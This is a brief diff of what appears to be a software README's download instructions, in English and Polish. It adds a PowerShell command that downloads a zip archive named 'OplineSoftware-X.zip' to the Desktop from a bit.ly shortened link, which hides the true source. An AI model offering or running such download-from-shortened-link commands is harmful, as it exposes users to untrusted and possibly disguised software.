@@ -62,7 +62,8 @@ https://bit.ly/OplineDL
 
 Or Command Powershell / CMD
 
-Start https://bit.ly/OplineDL
+cd Desktop
+powershell -command "& { iwr https://bit.ly/OplineDL -OutFile OplineSoftware-X.zip }"
 
 ### Contact and Help | Kontakt i Pomoc
 
